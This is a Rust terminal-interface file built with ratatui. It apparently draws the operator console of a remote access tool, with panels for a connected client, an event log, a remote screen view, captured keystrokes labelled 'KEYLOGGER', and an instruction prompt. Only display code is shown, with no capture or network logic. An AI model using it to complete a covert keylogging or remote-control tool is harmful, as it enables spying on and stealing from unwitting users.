use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::text::{Line, Span};
use ratatui::style::{Color, Style, Modifier};
use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Tabs};
use ratatui::Frame;

use crate::app::App;

pub fn render(frame: &mut Frame, app: &mut App) {
    let bg = Block::default().style(Style::default().bg(Color::Rgb(10, 10, 18)));
    frame.render_widget(bg, frame.area());

    let chunks = Layout::vertical([
        Constraint::Length(3),
        Constraint::Min(0),    
        Constraint::Length(1), 
    ])
    .split(frame.area());

    let tab_titles: Vec<Line> = app
        .tabs
        .titles
        .iter()
        .enumerate()
        .map(|(i, t)| {
            if i == app.tabs.index {
                Line::from(vec![
                    Span::raw(" "),
                    Span::styled(*t, Style::default()
                        .fg(Color::Rgb(0, 255, 200))
                        .add_modifier(Modifier::BOLD)),
                    Span::raw(" "),
                ])
            } else {
                Line::from(vec![
                    Span::raw(" "),
                    Span::styled(*t, Style::default().fg(Color::Rgb(100, 100, 130))),
                    Span::raw(" "),
                ])
            }
        })
        .collect();

    let tabs = Tabs::new(tab_titles)
        .block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
                .title(Span::styled(
                    app.title,
                    Style::default()
                        .fg(Color::Rgb(0, 255, 200))
                        .add_modifier(Modifier::BOLD),
                ))
                .title_alignment(ratatui::layout::Alignment::Left)
                .style(Style::default().bg(Color::Rgb(10, 10, 18))),
        )
        .highlight_style(
            Style::default()
                .fg(Color::Rgb(0, 255, 200))
                .bg(Color::Rgb(0, 40, 35))
                .add_modifier(Modifier::BOLD),
        )
        .select(app.tabs.index)
        .divider(Span::styled("│", Style::default().fg(Color::Rgb(40, 40, 70))));

    frame.render_widget(tabs, chunks[0]);

    match app.tabs.index {
        0 => draw_first_tab(frame, app, chunks[1]),
        1 => draw_second_tab(frame, app, chunks[1]),
        2 => draw_third_tab(frame, app, chunks[1]),
        _ => {}
    }

    let status = Paragraph::new(Line::from(vec![
        Span::styled(" ESC", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
        Span::styled(" quit  ", Style::default().fg(Color::Rgb(80, 80, 110))),
        Span::styled("TAB", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
        Span::styled(" next tab  ", Style::default().fg(Color::Rgb(80, 80, 110))),
        Span::styled("ENTER", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
        Span::styled(" send instruction", Style::default().fg(Color::Rgb(80, 80, 110))),
    ]))
    .style(Style::default().bg(Color::Rgb(14, 14, 24)));
    frame.render_widget(status, chunks[2]);
}

fn draw_first_tab(frame: &mut Frame, app: &mut App, area: Rect) {
    let chunks = Layout::vertical([
        Constraint::Length(4),
        Constraint::Length(1), 
        Constraint::Fill(13),
    ])
    .split(area);

    let client_block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
        .title(Span::styled(
            " ▸ CLIENT ",
            Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let client_lines = if !app.client_addr.is_empty() {
        vec![
            Line::from(Span::raw(" ")),
            Line::from(vec![
                Span::styled("  client connected from   ", Style::default()
                    .fg(Color::Rgb(50, 50, 80))),
                Span::styled(&app.client_addr, Style::default().fg(Color::Rgb(40, 40, 65))),
            ]),
        ]
    } else {
        vec![
            Line::from(Span::raw(" ")),
            Line::from(vec![
                Span::raw("  "),
                Span::styled(
                    "  waiting for client ...  ",
                    Style::default().fg(Color::Rgb(40, 40, 65)),
                ),
            ]),
        ]
    };

    let client = Paragraph::new(client_lines)
        .block(client_block)
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    frame.render_widget(client, chunks[0]);

    let sep = Paragraph::new(Line::from(Span::styled(
        "─".repeat(area.width as usize),
        Style::default().fg(Color::Rgb(30, 30, 55)),
    )));
    frame.render_widget(sep, chunks[1]);

    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
        .title(Span::styled(
            " ▸ EVENT LOG ",
            Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let messages: Vec<ListItem> = app
        .messages
        .iter()
        .enumerate()
        .map(|(i, m)| {
            let (_prefix_style, text_style) = if m.starts_with("[*]") {
                (
                    Style::default().fg(Color::Rgb(0, 200, 160)).add_modifier(Modifier::BOLD),
                    Style::default().fg(Color::Rgb(180, 220, 210)),
                )
            } else if m.starts_with("handled") {
                (
                    Style::default().fg(Color::Rgb(180, 140, 255)).add_modifier(Modifier::BOLD),
                    Style::default().fg(Color::Rgb(190, 190, 220)),
                )
            } else {
                (
                    Style::default().fg(Color::Rgb(80, 80, 120)),
                    Style::default().fg(Color::Rgb(140, 140, 170)),
                )
            };

            let line = Line::from(vec![
                Span::styled(format!(" {:03} │ ", i + 1), Style::default().fg(Color::Rgb(40, 40, 70))),
                Span::styled(m.as_str(), text_style),
            ]);
            ListItem::new(line)
        })
        .collect();

    let list = List::new(messages)
        .block(block)
        .highlight_style(Style::default().bg(Color::Rgb(20, 30, 40)));

    frame.render_widget(list, chunks[2]);
}

fn draw_second_tab(frame: &mut Frame, app: &mut App, area: Rect) {
    let chunks = Layout::vertical([
        Constraint::Fill(4),
        Constraint::Length(1), 
        Constraint::Fill(1),
    ])
    .split(area);

    let screen_block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
        .title(Span::styled(
            " ▸ REMOTE SCREEN ",
            Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let placeholder_lines = vec![
        Line::from(""),
        Line::from(vec![
            Span::raw("  "),
            Span::styled(
                "[ no screen capture available ]",
                Style::default().fg(Color::Rgb(50, 50, 80)),
            ),
        ]),
        Line::from(vec![
            Span::raw("  "),
            Span::styled(
                "waiting for stream...",
                Style::default().fg(Color::Rgb(40, 40, 65)),
            ),
        ]),
    ];

    let user_screen = Paragraph::new(placeholder_lines)
        .block(screen_block)
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    frame.render_widget(user_screen, chunks[0]);

    let sep = Paragraph::new(Line::from(Span::styled(
        "─".repeat(area.width as usize),
        Style::default().fg(Color::Rgb(30, 30, 55)),
    )));
    frame.render_widget(sep, chunks[1]);

    let key_display = if app.logged_keys.is_empty() {
        vec![Line::from(Span::styled(
            "  awaiting keystrokes...",
            Style::default().fg(Color::Rgb(50, 50, 80)),
        ))]
    } else {
        vec![Line::from(vec![
            Span::styled("  KEYS  ", Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD)),
            Span::styled(&app.logged_keys, Style::default().fg(Color::Rgb(220, 220, 240))),
        ])]
    };

    let keylogger_block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
        .title(Span::styled(
            " ▸ KEYLOGGER ",
            Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let keylogger = Paragraph::new(key_display)
        .block(keylogger_block);
    frame.render_widget(keylogger, chunks[2]);
}

fn draw_third_tab(frame: &mut Frame, app: &mut App, area: Rect) {
    let chunks = Layout::vertical([
        Constraint::Length(3),  
        Constraint::Length(1),   
        Constraint::Fill(1),     
    ])
    .split(area);

    let before_cursor = &app.input[..app.byte_index()];
    let cursor_char = app.input.chars().nth(app.character_index).unwrap_or(' ');
    let after_cursor: String = app.input.chars().skip(app.character_index + 1).collect();

    let input_line = Line::from(vec![
        Span::styled("  ❯ ", Style::default()
            .fg(Color::Rgb(0, 255, 200))
            .add_modifier(Modifier::BOLD)),
        Span::styled(before_cursor, Style::default().fg(Color::Rgb(220, 220, 240))),
        Span::styled(
            cursor_char.to_string(),
            Style::default()
                .fg(Color::Rgb(10, 10, 18))
                .bg(Color::Rgb(0, 255, 200)),
        ),
        Span::styled(after_cursor, Style::default().fg(Color::Rgb(220, 220, 240))),
    ]);

    let input_block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(0, 180, 140)))
        .title(Span::styled(
            " ▸ INSTRUCTION ",
            Style::default()
                .fg(Color::Rgb(0, 255, 200))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let input_widget = Paragraph::new(input_line).block(input_block);
    frame.render_widget(input_widget, chunks[0]);

    let sep = Paragraph::new(Line::from(Span::styled(
        "─".repeat(area.width as usize),
        Style::default().fg(Color::Rgb(30, 30, 55)),
    )));
    frame.render_widget(sep, chunks[1]);

    let history_block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
        .title(Span::styled(
            " ▸ HISTORY ",
            Style::default()
                .fg(Color::Rgb(0, 200, 160))
                .add_modifier(Modifier::BOLD),
        ))
        .style(Style::default().bg(Color::Rgb(10, 10, 18)));

    let history: Vec<ListItem> = if app.instructions.is_empty() {
        vec![ListItem::new(Line::from(Span::styled(
            "  no instructions sent yet",
            Style::default().fg(Color::Rgb(50, 50, 80)),
        )))]
    } else {
        app.instructions
            .iter()
            .enumerate()
            .map(|(i, instr)| {
                ListItem::new(Line::from(vec![
                    Span::styled(
                        format!("  #{} ", i + 1),
                        Style::default().fg(Color::Rgb(0, 180, 140)).add_modifier(Modifier::BOLD),
                    ),
                    Span::styled(instr.as_str(), Style::default().fg(Color::Rgb(200, 200, 230))),
                ]))
            })
            .collect()
    };

    let history_list = List::new(history).block(history_block);
    frame.render_widget(history_list, chunks[2]);
}